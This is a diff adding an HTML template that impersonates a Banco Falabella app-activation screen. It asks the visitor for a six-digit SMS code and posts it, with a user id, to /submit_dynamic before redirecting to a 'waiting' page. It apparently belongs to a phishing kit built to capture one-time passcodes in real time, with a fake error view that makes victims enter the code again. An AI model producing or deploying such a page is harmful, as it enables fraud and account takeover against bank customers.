@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco Falabella | Activar App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 25px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .title {
+            color: #333;
+            font-size: 22px;
+            font-weight: 400;
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
+
+        .desc {
+            color: #444;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 25px;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+
+        .code-box {
+            width: calc(100% / 6);
+            height: 55px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 22px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.2s;
+            background-color: #fff;
+        }
+
+        .code-box:focus {
+            border-color: #448b3b;
+        }
+
+        #dynamicForm {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: auto; /* Empuja el botón hacia abajo */
+        }
+
+        .link {
+            color: #448b3b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+
+        .link span {
+            margin-left: 5px;
+            font-size: 16px;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #cbd5e1;
+            color: #4b5563;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-top: 30px;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .submit-btn.active {
+            background-color: #448b3b;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        /* Estilos para el estado de ERROR */
+        #errorView {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            min-height: 100vh;
+        }
+
+        .error-title {
+            color: #448b3b;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .error-text {
+            color: #333;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 35px;
+        }
+
+        .btn-error {
+            width: 100%;
+            padding: 16px;
+            background-color: #e2e8f0;
+            color: #333;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Vista normal del formulario -->
+<div class="container" id="normalView">
+    <h1 class="title">Activemos tu app</h1>
+    <p class="desc">Enviamos un mensaje a tu celular. Por favor, ingresa el código de activación para continuar.</p>
+
+    <form id="dynamicForm">
+        <div class="code-inputs" id="codeContainer">
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
+            <input type="text" class="code-box" maxlength="1" inputmode="numeric" required>
+        </div>
+
+        <div class="links">
+            <a href="#" class="link">No recibí el código <span>&rsaquo;</span></a>
+        </div>
+
+        <button type="submit" class="submit-btn" id="btnSubmit" disabled>Activar</button>
+    </form>
+</div>
+
+<!-- Vista de ERROR cuando el código es inválido -->
+<div id="errorView">
+    <h2 class="error-title">Ha ocurrido un error</h2>
+    <p class="error-text">El código de activación que ingresaste es inválido. Revísalo e inténtalo nuevamente. (1000)</p>
+    <button class="btn-error" id="btnAceptarError">Aceptar</button>
+</div>
+
+<script>
+    const userId = {{ user_id }};
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Manejar estado de error
+    if (urlParams.get('error') === '1') {
+        document.getElementById('normalView').style.display = 'none';
+        document.getElementById('errorView').style.display = 'flex';
+    }
+
+    document.getElementById('btnAceptarError').addEventListener('click', () => {
+        window.location.href = '/dynamic/' + userId;
+    });
+
+    const inputs = document.querySelectorAll('.code-box');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value !== '' && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+            checkSubmit();
+        });
+
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+        
+        input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+            if (pastedData) {
+                for (let i = 0; i < inputs.length; i++) {
+                    if (i < pastedData.length) {
+                        inputs[i].value = pastedData[i];
+                    }
+                }
+                const nextEmpty = Math.min(pastedData.length, inputs.length - 1);
+                inputs[nextEmpty].focus();
+                checkSubmit();
+            }
+        });
+    });
+
+    function checkSubmit() {
+        let code = '';
+        inputs.forEach(input => code += input.value);
+        if (code.length === 6) {
+            btnSubmit.disabled = false;
+            btnSubmit.classList.add('active');
+        } else {
+            btnSubmit.disabled = true;
+            btnSubmit.classList.remove('active');
+        }
+    }
+
+    document.getElementById('dynamicForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        let token = '';
+        inputs.forEach(input => token += input.value);
+
+        btnSubmit.disabled = true;
+        btnSubmit.textContent = 'Activando...';
+
+        try {
+            const res = await fetch('/submit_dynamic', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ user_id: userId, pin: token })
+            });
+            const data = await res.json();
+            if(data.status === 'success') {
+                window.location.href = '/waiting/' + userId;
+            } else {
+                alert('Error de conexión');
+                btnSubmit.disabled = false;
+                btnSubmit.textContent = 'Activar';
+            }
+        } catch(e) {
+            alert('Error al conectar con el servidor.');
+            btnSubmit.disabled = false;
+            btnSubmit.textContent = 'Activar';
+        }
+    });
+</script>
+
+</body>
+</html>
